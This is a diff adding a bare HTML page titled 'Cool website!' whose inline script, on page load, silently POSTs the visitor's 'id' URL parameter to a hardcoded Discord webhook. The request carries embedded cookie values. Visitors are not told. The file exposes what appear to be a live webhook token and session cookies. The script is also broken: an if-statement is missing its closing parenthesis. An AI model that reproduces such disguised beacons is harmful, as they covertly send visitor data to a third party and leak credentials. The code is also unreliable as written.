@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<p>Cool website!</p>
+<script>
+  const searchParams = new URLSearchParams(window.location.search);
+
+  if (searchParams.has("id") {
+
+    var id = searchParams.get("id");
+    
+    const data = JSON.stringify({
+      "content": {id}
+    });
+    
+    const xhr = new XMLHttpRequest();
+    xhr.withCredentials = true;
+    
+    xhr.addEventListener("readystatechange", function () {
+      if (this.readyState === this.DONE) {
+        console.log(this.responseText);
+      }
+    });
+    
+    xhr.open("POST", "https://discord.com/api/v10/webhooks/1254785017239044158/A6aS0yOLK7n9Un5Z-kjfPKxfT2ynBOFtsN9Sm0rXV_oHg13a84uxWemHGrKcGntFLId3?wait=true");
+    xhr.setRequestHeader("cookie", "__dcfduid=580963c8192c11ef9a6e763250bcb023; __sdcfduid=580963c8192c11ef9a6e763250bcb02350b348de1f217f94aae1bcbc299d7215f2d79fac76ac53f874b3be492dc1254c; __cfruid=898c753edace177be71eebc756febf94be94b76c-1716486371; _cfuvid=_jWK0C8VmG06SiiN0vXB1rP_.hrekiTlz_S_wYgXfxE-1716486371858-0.0.1.1-604800000");
+    xhr.setRequestHeader("authority", "discord.com");
+    xhr.setRequestHeader("accept", "application/json");
+    xhr.setRequestHeader("accept-language", "en");
+    xhr.setRequestHeader("content-type", "application/json");
+    
+    xhr.send(data);
+  }
+</script>
+
+</body>
+</html>
